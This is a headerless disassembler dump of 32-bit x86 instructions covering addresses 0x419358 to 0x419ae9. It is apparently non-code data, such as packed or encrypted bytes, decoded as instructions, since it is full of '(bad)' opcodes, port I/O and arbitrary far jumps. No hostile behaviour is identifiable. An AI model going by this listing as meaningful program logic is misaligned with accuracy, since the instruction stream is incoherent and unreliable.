  419358:	loopne 0x419349
  41935a:	out    dx,al
  41935b:	pop    eax
  41935c:	cmp    DWORD PTR [eax],esi
  41935e:	dec    edx
  41935f:	(bad)  
  419360:	out    dx,eax
  419361:	inc    edi
  419362:	pop    ss
  419363:	cmp    al,0x70
  419365:	test   al,0x15
  419367:	in     al,dx
  419368:	cmp    cl,BYTE PTR [edi+esi*4]
  41936b:	daa    
  41936c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41936d:	addr16 sbb eax,0x2cf8ad32
  419373:	call   0x89482d8e
  419378:	mov    ds:0x66eb93d3,al
  41937d:	add    esp,DWORD PTR [eax+0x3a51ba]
  419383:	mov    esi,0xf6d72cd6
  419388:	ret    
  419389:	aad    0x3b
  41938b:	(bad)  
  41938c:	leave  
  41938d:	xor    DWORD PTR [ebx-0x8d185e4],esp
  419393:	aaa    
  419394:	clc    
  419395:	(bad)  
  419396:	xchg   ebx,eax
  419397:	loopne 0x4193eb
  419399:	push   0xd74dc23e
  41939e:	shl    DWORD PTR [ebp+0x56],1
  4193a1:	xchg   ebp,eax
  4193a2:	(bad)  
  4193a3:	(bad)  
  4193a4:	or     cl,dl
  4193a6:	clc    
  4193a7:	add    ah,al
  4193a9:	les    edi,FWORD PTR [edi]
  4193ab:	and    al,BYTE PTR [esi]
  4193ad:	mov    ds:0xafc55336,eax
  4193b2:	es dec ebx
  4193b4:	xor    al,0xe4
  4193b6:	inc    ecx
  4193b7:	lea    ebp,[edx+0x12]
  4193ba:	clc    
  4193bb:	imul   ebp,DWORD PTR [ebx],0x3c0fadac
  4193c1:	test   al,0x30
  4193c3:	loop   0x4193b2
  4193c5:	sub    DWORD PTR [eax],0x75b2406f
  4193cb:	dec    esp
  4193cc:	fimul  WORD PTR [ecx]
  4193ce:	(bad)  
  4193cf:	fucomp st(3)
  4193d1:	sbb    eax,0xf683aca1
  4193d6:	retf   
  4193d7:	add    eax,0xcc393a7b
  4193dc:	mov    esi,0x44fcf585
  4193e1:	inc    esp
  4193e2:	lods   al,BYTE PTR ds:[esi]
  4193e3:	repnz pop eax
  4193e5:	pop    esp
  4193e6:	in     eax,dx
  4193e7:	lods   eax,DWORD PTR ds:[esi]
  4193e8:	fcom   DWORD PTR [ebx]
  4193ea:	lahf   
  4193eb:	xchg   ebp,eax
  4193ec:	or     dh,BYTE PTR [edx]
  4193ee:	jb     0x4193ba
  4193f0:	pop    DWORD PTR [ecx+0x61]
  4193f3:	xchg   edi,eax
  4193f4:	adc    ecx,DWORD PTR [esi+0xe9c5e42]
  4193fa:	jne    0x4193d4
  4193fc:	enter  0x6b08,0x6c
  419400:	sub    DWORD PTR [ebp-0x70cdef36],ebx
  419406:	adc    BYTE PTR [edx],dl
  419408:	bound  edx,QWORD PTR [esi+0x29]
  41940b:	test   BYTE PTR [ecx-0x5c463b7d],al
  419411:	jbe    0x419456
  419413:	(bad)  
  419414:	cwde   
  419415:	imul   edi,DWORD PTR [ebx-0x12f0cc12],0x19ccd73f
  41941f:	xor    dl,BYTE PTR [esi+0x7211284e]
  419425:	lahf   
  419426:	xor    DWORD PTR [ebx-0x78752bee],edi
  41942c:	xor    edi,DWORD PTR [esi+0x19980868]
  419432:	mov    al,ds:0xced44c06
  419437:	lds    eax,FWORD PTR [ebx+edx*8]
  41943a:	mov    cs,WORD PTR [ecx-0x6b4383e7]
  419440:	iret   
  419441:	test   eax,0xf0c564cb
  419446:	(bad)  [edi-0x6a]
  419449:	adc    ecx,DWORD PTR [ebp+0x49]
  41944c:	arpl   bx,dx
  41944e:	imul   eax,DWORD PTR [ebx+0x26],0xd422e5f5
  419455:	lahf   
  419456:	mov    ch,0x56
  419458:	sbb    al,dl
  41945a:	mov    al,ch
  41945c:	mov    ds:0xd83f2032,eax
  419461:	pop    ds
  419462:	outs   dx,DWORD PTR ds:[esi]
  419463:	cwde   
  419464:	(bad)  
  419465:	sub    al,0x68
  419467:	inc    ebp
  419468:	fmul   QWORD PTR [edx]
  41946a:	mov    al,ds:0x73b9dfab
  419470:	sub    esi,DWORD PTR [ebp+0x2779a55]
  419476:	pop    ebp
  419477:	shl    BYTE PTR [esi+0x1],cl
  41947a:	jno    0x4194ee
  41947c:	mov    cl,0xf1
  41947e:	inc    ebp
  41947f:	stc    
  419480:	ret    
  419481:	mov    bl,0x5e
  419483:	xor    bl,dl
  419485:	jb     0x41943f
  419487:	mov    edi,eax
  419489:	cvtdq2ps xmm5,XMMWORD PTR [esi]
  41948c:	push   cs
  41948d:	mov    ebx,0x2a23a9ef
  419492:	dec    edi
  419493:	rol    eax,cl
  419495:	cmp    al,0x30
  419497:	in     al,dx
  419498:	push   0x6477d0cf
  41949d:	repz fnstcw WORD PTR [eax-0x31]
  4194a1:	enter  0x7107,0x62
  4194a5:	push   ss
  4194a6:	sub    cl,bh
  4194a8:	inc    ebp
  4194a9:	icebp  
  4194aa:	jmp    FWORD PTR [esi-0x36cad0fc]
  4194b0:	or     al,0xc4
  4194b2:	cmp    dl,BYTE PTR [ecx-0x2c78a843]
  4194b8:	sbb    cl,BYTE PTR [edi]
  4194ba:	(bad)  
  4194bb:	aaa    
  4194bc:	int3   
  4194bd:	fdivr  QWORD PTR ds:0xfdc0b84d
  4194c3:	das    
  4194c4:	inc    ecx
  4194c5:	push   ss
  4194c6:	dec    edx
  4194c7:	push   eax
  4194c8:	mov    BYTE PTR ds:0xe4fef773,dh
  4194ce:	jmp    0x757a:0x1078879c
  4194d5:	dec    ecx
  4194d6:	js     0x4194e8
  4194d8:	add    eax,0xc4518658
  4194dd:	push   edx
  4194de:	jne    0x419490
  4194e0:	add    al,0x8f
  4194e2:	pop    ecx
  4194e3:	jl     0x41948f
  4194e5:	leave  
  4194e6:	fwait
  4194e7:	aad    0xa8
  4194e9:	int3   
  4194ea:	mov    WORD PTR [esi],fs
  4194ec:	pushf  
  4194ed:	pop    esi
  4194ee:	jbe    0x419529
  4194f0:	inc    esi
  4194f1:	adc    eax,0x9d0b5128
  4194f6:	jl     0x4194d4
  4194f8:	xchg   ebp,eax
  4194f9:	arpl   bx,bp
  4194fb:	mov    BYTE PTR [esi],dl
  4194fd:	fbld   TBYTE PTR [edi+esi*1-0x59]
  419501:	pop    edx
  419502:	shr    BYTE PTR [ebx],0xdb
  419505:	adc    BYTE PTR [ecx+ebx*2+0x7d594552],ah
  41950c:	fidivr WORD PTR [ebp-0x7e]
  41950f:	dec    ebp
  419510:	cli    
  419511:	cmp    DWORD PTR [edx+eiz*1-0x2c],edi
  419515:	and    al,BYTE PTR [ebp+0x356e671a]
  41951b:	jmp    0x80a0db8
  419520:	out    dx,eax
  419521:	dec    ebx
  419522:	rcr    BYTE PTR [edi+0x13],cl
  419525:	and    BYTE PTR [ebx],0x6e
  419528:	std    
  419529:	ds imul ebx,ebx,0xec53e21f
  419530:	imul   DWORD PTR [ebp+0x0]
  419533:	cmp    eax,0x7a5b15b5
  419538:	inc    eax
  419539:	sbb    ch,BYTE PTR [ebx+0x7ee37c59]
  41953f:	(bad)  [ecx-0x1f]
  419542:	inc    esp
  419543:	and    eax,0xb77a757e
  419548:	dec    eax
  419549:	ret    0xd24
  41954c:	repnz push eax
  41954e:	outs   dx,BYTE PTR ds:[esi]
  41954f:	iret   
  419550:	mov    bh,0xdf
  419552:	aad    0xf7
  419554:	cwde   
  419555:	test   DWORD PTR [esi+0x28d9c49],ecx
  41955b:	xlat   BYTE PTR ds:[ebx]
  41955c:	ins    DWORD PTR es:[edi],dx
  41955d:	mov    cl,BYTE PTR ds:0x75daa095
  419563:	xor    DWORD PTR [edi+0x3a],edi
  419566:	add    esi,DWORD PTR [ecx+0x538bdf8e]
  41956c:	pop    esi
  41956d:	sub    DWORD PTR [esp],esp
  419570:	pop    ebp
  419571:	clc    
  419572:	sbb    ebx,DWORD PTR [eax+ebp*4-0xe]
  419576:	mov    ch,BYTE PTR [edx-0xa]
  419579:	int    0x68
  41957b:	sub    BYTE PTR [esi-0xd0a1361],0xda
  419582:	not    edx
  419584:	icebp  
  419585:	fdivp  st(1),st
  419587:	inc    esp
  419588:	lods   al,BYTE PTR ds:[esi]
  419589:	mov    ds:0x88230652,eax
  41958e:	jns    0x4195da
  419590:	pop    ds
  419591:	into   
  419592:	mov    ?,WORD PTR [ecx+0x10]
  419595:	les    ebx,FWORD PTR [edi+0x41727c0b]
  41959b:	gs xchg esi,eax
  41959d:	leave  
  41959e:	test   DWORD PTR [ecx+0x57],esp
  4195a1:	push   ecx
  4195a2:	fldenv [ebx]
  4195a4:	dec    eax
  4195a5:	out    0x6a,al
  4195a7:	jp     0x4195c9
  4195a9:	and    ax,0xe64d
  4195ad:	popa   
  4195ae:	call   FWORD PTR [esp+eiz*2+0x71]
  4195b2:	ret    
  4195b3:	mov    esp,0xc0cf5ba7
  4195b8:	mov    BYTE PTR [ebx+0x14],cl
  4195bb:	fsubp  st(4),st
  4195bd:	jmp    0x4195d8
  4195bf:	std    
  4195c0:	inc    edx
  4195c1:	retf   0x7227
  4195c4:	add    BYTE PTR [ecx-0x59],ah
  4195c7:	mov    edi,0xc7272962
  4195cc:	mov    eax,0xbd57e1b
  4195d1:	add    DWORD PTR [ebx-0x5a],ecx
  4195d4:	mov    dh,0xc2
  4195d6:	jmp    0x419571
  4195d8:	xchg   edx,eax
  4195d9:	push   esi
  4195da:	bound  edi,QWORD PTR ds:0x4b3c1794
  4195e0:	clc    
  4195e1:	mov    ecx,0xb633fae1
  4195e6:	aam    0xd1
  4195e8:	inc    ch
  4195ea:	dec    eax
  4195eb:	ror    ebx,1
  4195ed:	pop    esp
  4195ee:	jecxz  0x4195b0
  4195f0:	(bad)  [esi]
  4195f2:	rol    DWORD PTR [esi],1
  4195f4:	add    bl,dl
  4195f6:	daa    
  4195f7:	arpl   si,si
  4195f9:	repz adc esp,DWORD PTR [edi]
  4195fc:	cli    
  4195fd:	repnz push esi
  4195ff:	and    BYTE PTR [ebp-0x4f],0x91
  419603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419604:	stc    
  419605:	inc    ebx
  419606:	sti    
  419607:	test   DWORD PTR [ebp+0x2a7bb383],0x6c0d2cbf
  419611:	fbld   TBYTE PTR [eax-0x57]
  419614:	mov    eax,0xc6f4ae0b
  419619:	aad    0x4d
  41961b:	cmp    ah,dh
  41961d:	ins    DWORD PTR es:[edi],dx
  41961e:	jae    0x419601
  419620:	or     al,0xa2
  419622:	adc    al,BYTE PTR [ecx+eax*4]
  419625:	inc    edx
  419626:	push   cs
  419627:	jmp    0x419644
  419629:	rol    BYTE PTR [ebx-0x33],1
  41962c:	ins    BYTE PTR es:[edi],dx
  41962d:	inc    esp
  41962e:	and    al,0xd6
  419630:	stos   DWORD PTR es:[edi],eax
  419631:	mov    ds:0x96f18389,eax
  419636:	dec    esp
  419637:	and    ebx,DWORD PTR [eax]
  419639:	(bad)  
  41963b:	jg     0x419697
  41963d:	ins    BYTE PTR es:[edi],dx
  41963e:	cld    
  41963f:	and    ebp,ebp
  419641:	dec    esi
  419642:	add    BYTE PTR [ecx+edx*8-0x58],al
  419646:	cli    
  419647:	jne    0x419618
  419649:	leave  
  41964a:	es and al,0xac
  41964d:	scas   al,BYTE PTR es:[edi]
  41964e:	push   ecx
  41964f:	push   esi
  419650:	jns    0x419661
  419652:	popa   
  419653:	xchg   ebx,eax
  419654:	jo     0x419638
  419656:	xor    eax,0x641d1c0f
  41965b:	push   ebx
  41965c:	mov    edx,0x3cc292a
  419661:	cmp    esi,edi
  419663:	sub    al,0x1e
  419665:	or     ah,al
  419667:	inc    edi
  419668:	mov    esi,0x710e0eee
  41966d:	lahf   
  41966e:	aam    0x88
  419670:	adc    DWORD PTR [edx+edi*8-0x52641cd7],edi
  419677:	mov    ?,WORD PTR [ebp-0x1d]
  41967a:	arpl   WORD PTR [ecx],dx
  41967c:	ins    DWORD PTR es:[edi],dx
  41967d:	enter  0x8f7,0xdc
  419681:	push   ebx
  419682:	fdivr  DWORD PTR ds:[edx+0x4e2a620b]
  419689:	xchg   ebx,esi
  41968b:	xor    esi,DWORD PTR [esi-0x1d]
  41968e:	das    
  41968f:	(bad)  
  419690:	shr    BYTE PTR ds:0xc5b06f22,1
  419696:	mov    esi,0x6d1badd8
  41969b:	ss not esp
  41969e:	push   es
  41969f:	shl    BYTE PTR [edi-0x3e],0x90
  4196a3:	(bad)  
  4196a4:	push   ebp
  4196a5:	aam    0x28
  4196a7:	ins    BYTE PTR es:[edi],dx
  4196a8:	sbb    esi,0xe9e318ce
  4196ae:	push   ecx
  4196af:	mov    dh,0x24
  4196b1:	lea    edx,[edx-0x51915bb3]
  4196b7:	jl     0x419694
  4196b9:	test   ebp,eax
  4196bb:	outs   dx,BYTE PTR ds:[esi]
  4196bc:	push   esp
  4196bd:	push   eax
  4196be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196bf:	int    0xb0
  4196c1:	mov    ch,0xe3
  4196c3:	mov    bl,0x5
  4196c5:	cwde   
  4196c6:	shl    BYTE PTR [ebp+0x133fa0a1],cl
  4196cc:	push   esp
  4196cd:	mov    es,edx
  4196cf:	out    0x42,eax
  4196d1:	pop    esp
  4196d2:	sti    
  4196d3:	loop   0x419695
  4196d5:	and    eax,0x8f586213
  4196da:	mov    ecx,0x2a87dbbe
  4196df:	pop    ss
  4196e0:	inc    ecx
  4196e1:	test   ecx,esi
  4196e3:	xchg   esp,eax
  4196e4:	imul   esp,ebx,0xfffffffd
  4196e7:	idiv   BYTE PTR [ecx+0x68ff3f97]
  4196ed:	les    ecx,FWORD PTR [ecx+0x21]
  4196f0:	xchg   edi,eax
  4196f1:	cmp    al,0xe7
  4196f3:	test   BYTE PTR [ebp+0x16],0x97
  4196f7:	ret    0xb2b7
  4196fa:	neg    DWORD PTR [eax]
  4196fc:	or     DWORD PTR [ebp+0x14],ecx
  4196ff:	mov    esp,0x970e1c2e
  419704:	or     DWORD PTR [ebp+0x2c17d27c],edi
  41970a:	xor    esp,edx
  41970c:	push   0xf23e1ec9
  419711:	pushf  
  419712:	pop    ds
  419713:	xchg   ebp,eax
  419714:	shr    DWORD PTR [ecx-0x6b],cl
  419717:	or     eax,0xff7e1fa1
  41971c:	and    ah,BYTE PTR [edi+0x3e]
  41971f:	xor    DWORD PTR [esi+eax*4],esi
  419722:	push   ds
  419723:	cs push ebp
  419725:	dec    ecx
  419726:	adc    dh,ah
  419728:	in     eax,dx
  419729:	jns    0x419713
  41972b:	mov    fs,WORD PTR [edi+0x44]
  41972e:	jnp    0x4196db
  419730:	push   0x41b9bdac
  419735:	inc    ecx
  419736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419737:	sar    DWORD PTR [esi+0x68b6c451],1
  41973d:	sub    al,0xa2
  41973f:	jnp    0x419723
  419741:	loop   0x41978f
  419743:	sti    
  419744:	jge    0x419718
  419746:	xchg   ebp,eax
  419747:	sahf   
  419748:	jnp    0x419749
  41974a:	cs jp  0x419760
  41974d:	jmp    0x4196d5
  41974f:	data16 mov bl,0x5d
  419752:	mov    BYTE PTR ds:[esi-0x1a],dh
  419756:	iret   
  419757:	fsub   QWORD PTR [ebp+0x2abf2763]
  41975d:	mov    al,0xc0
  41975f:	sbb    al,0x99
  419761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419762:	push   ebp
  419763:	push   cs
  419764:	arpl   si,cx
  419766:	fwait
  419767:	cmp    al,BYTE PTR ss:[edx+0xff33e89]
  41976e:	and    DWORD PTR [ebp+0x727f20a9],ecx
  419774:	sub    ah,BYTE PTR [ebx-0x69]
  419777:	mov    dh,0x8f
  419779:	in     eax,dx
  41977a:	pop    ss
  41977b:	loopne 0x419792
  41977d:	cld    
  41977e:	imul   ebp,DWORD PTR [ebp+eax*8+0x49e04042],0x22
  419786:	xor    edx,ecx
  419788:	ror    BYTE PTR [ebp-0x4d],0x7b
  41978c:	(bad)  
  41978d:	in     eax,dx
  41978e:	xor    al,0x93
  419790:	daa    
  419791:	jmp    0xcfc17ea0
  419796:	sub    BYTE PTR [esi],al
  419798:	arpl   WORD PTR [ecx],ax
  41979a:	cdq    
  41979b:	repz ret 0x6ab3
  41979f:	addr16 xchg esi,eax
  4197a1:	add    DWORD PTR [ecx+eiz*4-0x2e],0x76
  4197a6:	xchg   ebx,eax
  4197a7:	or     ebp,DWORD PTR [ecx-0x5d]
  4197aa:	sub    eax,0x9f36e118
  4197b0:	cmp    al,BYTE PTR [eax]
  4197b2:	ins    DWORD PTR es:[edi],dx
  4197b3:	test   BYTE PTR ds:0x162ba50e,dh
  4197b9:	xlat   BYTE PTR ds:[ebx]
  4197ba:	jno    0x419780
  4197bc:	xor    BYTE PTR [ecx],dh
  4197be:	cld    
  4197bf:	xor    BYTE PTR [ebx],bl
  4197c1:	dec    ecx
  4197c2:	pop    ecx
  4197c3:	push   es
  4197c4:	fld    TBYTE PTR [ebp-0x3ae31ec3]
  4197ca:	xchg   esp,eax
  4197cb:	or     ah,BYTE PTR [ecx+0x45]
  4197ce:	and    edi,DWORD PTR [esi+ebx*4]
  4197d1:	jp     0x419840
  4197d3:	imul   esp,esi,0x5c
  4197d6:	test   DWORD PTR [edx],esi
  4197d8:	push   ss
  4197d9:	enter  0xb278,0x7f
  4197dd:	or     BYTE PTR [edi+0x2e3cb75e],0x64
  4197e4:	adc    cl,BYTE PTR [ebx+0x5abd11a0]
  4197ea:	inc    ecx
  4197eb:	jns    0x4197a7
  4197ed:	bound  esi,QWORD PTR [esi-0x362eac3c]
  4197f3:	cli    
  4197f4:	fdiv   st(4),st
  4197f6:	leave  
  4197f7:	hlt    
  4197f8:	sbb    eax,0xead993a3
  4197fd:	sti    
  4197fe:	js     0x4197b3
  419800:	call   0x1a5d28a5
  419805:	push   0xc
  419807:	les    edi,FWORD PTR [edi+0x63]
  41980a:	aam    0x3f
  41980c:	sbb    bl,al
  41980e:	sbb    al,0x85
  419810:	or     dh,BYTE PTR [ecx-0x314dba11]
  419816:	push   0x69
  419818:	ja     0x419850
  41981a:	scas   al,BYTE PTR es:[edi]
  41981b:	popf   
  41981c:	dec    ebp
  41981d:	sbb    edx,DWORD PTR [esi+0x34]
  419820:	mov    cl,0x20
  419822:	mov    ds:0x73d8320f,al
  419827:	cdq    
  419828:	std    
  419829:	loopne 0x41984e
  41982b:	jae    0x419886
  41982d:	jbe    0x419816
  41982f:	lods   eax,DWORD PTR ds:[esi]
  419830:	xchg   edx,eax
  419831:	add    esi,esp
  419833:	adc    DWORD PTR [edi+eiz*2-0x55],esp
  419837:	(bad)  
  419838:	shl    ch,1
  41983a:	dec    ebp
  41983b:	pop    edx
  41983c:	xchg   esi,eax
  41983d:	mov    WORD PTR [ebx-0x74],fs
  419840:	push   ss
  419841:	mov    ebx,0x6e0d1733
  419846:	popa   
  419847:	or     BYTE PTR [edx],ah
  419849:	dec    ecx
  41984a:	shl    BYTE PTR [eax-0x730a18b0],1
  419850:	scas   al,BYTE PTR es:[edi]
  419851:	xlat   BYTE PTR ds:[ebx]
  419852:	and    eax,0xf49e1d1e
  419857:	clc    
  419858:	xor    BYTE PTR [esi+0x61d56aef],bh
  41985e:	or     BYTE PTR [ecx-0x35],dh
  419861:	cmc    
  419862:	call   0x5838edc
  419867:	outs   dx,DWORD PTR ds:[esi]
  419868:	or     esi,ecx
  41986a:	popa   
  41986b:	mov    esp,0x35df2501
  419870:	cdq    
  419871:	dec    edx
  419872:	inc    esi
  419873:	into   
  419874:	push   edx
  419875:	jge    0x419899
  419877:	push   esi
  419878:	dec    ebp
  419879:	fnstenv [esp+eax*8-0x5b3ae52b]
  419880:	aas    
  419881:	iret   
  419882:	clc    
  419883:	inc    ecx
  419884:	arpl   ax,si
  419886:	pop    esi
  419887:	daa    
  419888:	cmp    ebp,DWORD PTR [ebx+0x4a]
  41988b:	enter  0xcbe7,0x6c
  41988f:	stos   DWORD PTR es:[edi],eax
  419890:	xchg   esp,eax
  419891:	loop   0x419904
  419893:	sub    edx,DWORD PTR [ecx]
  419895:	scas   al,BYTE PTR es:[edi]
  419896:	jecxz  0x419838
  419898:	fadd   QWORD PTR [esi]
  41989a:	pop    ss
  41989b:	(bad)  
  41989c:	and    al,0x1a
  41989e:	mov    dl,0xcd
  4198a0:	mov    edi,0x3f9e4878
  4198a5:	lods   eax,DWORD PTR ds:[esi]
  4198a6:	push   ebp
  4198a7:	ja     0x419900
  4198a9:	push   es
  4198aa:	lahf   
  4198ab:	dec    ebp
  4198ac:	ror    DWORD PTR [ebx+0x0],cl
  4198af:	push   eax
  4198b0:	cmp    al,0xe
  4198b2:	cmp    BYTE PTR [esi],bl
  4198b4:	dec    ebx
  4198b5:	test   al,0x67
  4198b7:	cmp    esp,DWORD PTR [eax-0x66]
  4198ba:	idiv   BYTE PTR [edx+esi*1]
  4198bd:	outs   dx,DWORD PTR ds:[esi]
  4198be:	inc    ecx
  4198bf:	push   ecx
  4198c0:	retf   0x65c1
  4198c3:	rcl    bh,1
  4198c5:	xchg   edx,eax
  4198c6:	out    dx,eax
  4198c7:	in     al,0xc6
  4198c9:	dec    esp
  4198ca:	int3   
  4198cb:	pusha  
  4198cc:	jo     0x41985f
  4198ce:	jo     0x4198bc
  4198d0:	push   edi
  4198d1:	sbb    al,0x4b
  4198d3:	fwait
  4198d4:	test   DWORD PTR [eax],ecx
  4198d6:	xor    BYTE PTR [esi+esi*1+0x21],ch
  4198da:	or     dh,BYTE PTR ds:0x1d6dcbad
  4198e0:	outs   dx,DWORD PTR ds:[esi]
  4198e1:	cmp    DWORD PTR ds:0xbd6e8c2b,edx
  4198e7:	push   edi
  4198e8:	cmc    
  4198e9:	iret   
  4198ea:	lock sub eax,eax
  4198ed:	sbb    dl,al
  4198ef:	or     al,0xb0
  4198f1:	push   0xffffff8b
  4198f3:	cs in  eax,dx
  4198f5:	jle    0x419883
  4198f7:	adc    DWORD PTR [ecx+0x3afb0b1f],ebp
  4198fd:	inc    ebp
  4198fe:	inc    ebp
  4198ff:	jb     0x419946
  419901:	call   0x5ec6:0x1a11dcbe
  419908:	out    dx,al
  419909:	pop    eax
  41990a:	xchg   ecx,eax
  41990b:	popa   
  41990c:	or     eax,0x56634e6d
  419911:	sub    ebp,ebx
  419913:	dec    ebp
  419914:	retf   
  419915:	sbb    DWORD PTR [ebp-0x6e1cc04c],0x4586fa6f
  41991f:	fsub   DWORD PTR [edi+0x9]
  419922:	push   edx
  419923:	imul   ebp,DWORD PTR [ebp+0x13],0x88c47720
  41992a:	loope  0x419959
  41992c:	stc    
  41992d:	mov    eax,0xd9faf2c6
  419932:	dec    eax
  419933:	jo     0x419908
  419935:	sbb    dl,BYTE PTR [esp+edi*1]
  419938:	sbb    BYTE PTR [eax+0x32],ch
  41993b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41993c:	imul   edi,DWORD PTR [edx-0x1fd28152],0x79
  419943:	fsub   st,st(2)
  419945:	not    ecx
  419947:	dec    esp
  419948:	adc    eax,0x7aae2b8c
  41994d:	inc    ebx
  41994e:	adc    al,BYTE PTR [ebx-0x69]
  419951:	dec    edx
  419952:	mov    bh,0x39
  419954:	dec    eax
  419955:	adc    al,0xf6
  419957:	mov    ebx,0x9540b1f1
  41995c:	test   DWORD PTR [ebp+0xd],0x6b54f78b
  419963:	mov    ebp,0x6e7edb55
  419968:	xchg   ecx,eax
  419969:	sbb    ebp,edx
  41996b:	cli    
  41996c:	sub    ebx,ebp
  41996e:	cdq    
  41996f:	add    eax,eax
  419971:	ror    ecx,cl
  419973:	aam    0x1a
  419975:	add    DWORD PTR [eax-0x7c],esp
  419978:	jmp    0x41993f
  41997a:	loopne 0x4199cf
  41997c:	sub    al,0x3d
  41997e:	test   DWORD PTR [edx],0x743c5b27
  419984:	jno    0x4199cd
  419986:	jp     0x41990c
  419988:	js     0x419985
  41998a:	push   esi
  41998b:	cli    
  41998c:	push   esi
  41998d:	mov    eax,0x96e678fa
  419992:	test   DWORD PTR [esi],ebp
  419994:	xchg   edx,eax
  419995:	mov    ebp,0xabfa0549
  41999a:	lods   al,BYTE PTR ds:[esi]
  41999b:	ret    0xe256
  41999e:	into   
  41999f:	jb     0x419a00
  4199a1:	mov    bh,0xb0
  4199a3:	and    BYTE PTR [ebx],cl
  4199a5:	adc    esp,DWORD PTR [eax]
  4199a7:	mov    cl,0x3d
  4199a9:	lods   eax,DWORD PTR ds:[esi]
  4199aa:	xlat   BYTE PTR ds:[ebx]
  4199ab:	pop    ds
  4199ac:	scas   eax,DWORD PTR es:[edi]
  4199ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199ae:	das    
  4199af:	xchg   ebp,eax
  4199b0:	mov    es,WORD PTR [ebx]
  4199b2:	xor    DWORD PTR [edi-0x6f],ebp
  4199b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199b6:	pop    esi
  4199b7:	sbb    dh,ch
  4199b9:	pushf  
  4199ba:	xchg   esp,eax
  4199bb:	sub    eax,0x39e0c85e
  4199c0:	hlt    
  4199c1:	pushf  
  4199c2:	push   edi
  4199c3:	(bad)  
  4199c4:	je     0x419979
  4199c6:	(bad)  
  4199c7:	call   0xb46e:0xa1ced0cf
  4199ce:	in     eax,dx
  4199cf:	sbb    al,0x8d
  4199d1:	cmp    DWORD PTR [ebx+0x1b],edx
  4199d4:	cmp    DWORD PTR [eax+0x4a7ec3bf],0x7b985acc
  4199de:	xchg   ebx,eax
  4199df:	(bad)  
  4199e1:	xor    ch,BYTE PTR [eax]
  4199e3:	push   es
  4199e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199e5:	hlt    
  4199e6:	mov    edx,0xa8f0da91
  4199eb:	push   ecx
  4199ec:	neg    DWORD PTR [edx-0x14]
  4199ef:	ja     0x4199bb
  4199f1:	loop   0x419a43
  4199f3:	jo     0x419a06
  4199f5:	mov    ebx,0xa4d1111f
  4199fa:	sbb    BYTE PTR [ebp+0x53],ah
  4199fd:	jae    0x4199a0
  4199ff:	and    cl,BYTE PTR [edi-0x526e532c]
  419a05:	mov    ebx,ebx
  419a07:	bound  eax,QWORD PTR [eax+0x2]
  419a0a:	ins    DWORD PTR es:[edi],dx
  419a0b:	pop    esi
  419a0c:	jbe    0x4199d3
  419a0e:	pop    esi
  419a0f:	std    
  419a10:	out    0x7,al
  419a12:	test   dl,dl
  419a14:	sub    ebp,DWORD PTR [ecx]
  419a16:	xor    BYTE PTR [edi+0x3a],bh
  419a19:	cmc    
  419a1a:	out    dx,eax
  419a1b:	leave  
  419a1c:	inc    esi
  419a1d:	push   ds
  419a1e:	xchg   DWORD PTR [eax],edx
  419a20:	lea    ebx,[ebx+0x2d]
  419a23:	dec    edi
  419a24:	fucom  st(6)
  419a26:	scas   al,BYTE PTR es:[edi]
  419a27:	push   es
  419a28:	test   al,0xa7
  419a2a:	pop    esi
  419a2b:	call   FWORD PTR [ecx]
  419a2d:	cli    
  419a2e:	sub    bh,dl
  419a30:	jl     0x4199c4
  419a32:	mov    edi,0x33bb910a
  419a38:	mov    dh,0x38
  419a3a:	jl     0x419ab8
  419a3c:	cmp    edi,DWORD PTR [esi+0x57ce5c27]
  419a42:	ret    
  419a43:	mov    cs,ecx
  419a45:	test   edi,ecx
  419a47:	xchg   ecx,eax
  419a48:	adc    DWORD PTR [esi+0x4d],0xdf155864
  419a4f:	xchg   ebp,eax
  419a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a51:	dec    esi
  419a52:	jns    0x4199dd
  419a54:	les    edx,FWORD PTR [esi-0x4e]
  419a57:	jnp    0x419a22
  419a59:	aaa    
  419a5a:	leave  
  419a5b:	ror    BYTE PTR [edi-0x64],0xac
  419a5f:	push   cs
  419a60:	and    eax,DWORD PTR [edx+0x71860e38]
  419a66:	xchg   esi,eax
  419a67:	dec    edx
  419a68:	jno    0x419aba
  419a6a:	and    cl,bh
  419a6c:	mov    ch,0xf0
  419a6e:	add    BYTE PTR [eax+esi*2],ch
  419a71:	sbb    eax,0x4f791157
  419a76:	fiadd  WORD PTR [edi+0x6f]
  419a79:	jmp    0x419a49
  419a7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a7c:	push   edx
  419a7d:	ja     0x419a67
  419a7f:	fcom   QWORD PTR [edx]
  419a81:	jbe    0x419ab6
  419a83:	and    al,0x9a
  419a85:	push   cs
  419a86:	sub    al,0xc3
  419a88:	and    BYTE PTR ds:0xedcf187d,ah
  419a8e:	adc    ebp,edx
  419a90:	xchg   ecx,eax
  419a91:	push   ss
  419a92:	jecxz  0x419a1e
  419a94:	idiv   BYTE PTR cs:[ebx+0x24]
  419a98:	add    DWORD PTR [esi-0x2a493b23],edi
  419a9e:	pop    ebp
  419a9f:	add    BYTE PTR [edi-0x4af2fcd7],0x39
  419aa6:	or     eax,DWORD PTR [ebp-0x2d3ab785]
  419aac:	xchg   edx,eax
  419aad:	and    BYTE PTR [edx+edi*8],0x38
  419ab1:	sbb    DWORD PTR [ecx+eax*2+0x758b2aa7],0x23
  419ab9:	mov    al,ds:0xa63adb38
  419abe:	adc    eax,0xbb26e773
  419ac3:	lds    ebx,FWORD PTR [ebp-0x5fa82559]
  419ac9:	inc    ecx
  419aca:	icebp  
  419acb:	cdq    
  419acc:	push   ebx
  419acd:	sti    
  419ace:	(bad)  
  419acf:	or     eax,0x488a870a
  419ad4:	inc    esi
  419ad5:	push   ebp
  419ad6:	xor    edx,DWORD PTR [ebx]
  419ad8:	mov    edi,0x76b285a1
  419add:	mov    al,0xa5
  419adf:	cli    
  419ae0:	scas   eax,DWORD PTR es:[edi]
  419ae1:	jmp    0x5a8b:0xa4d380dc
  419ae8:	dec    ecx
  419ae9:	jnp    0x419b34
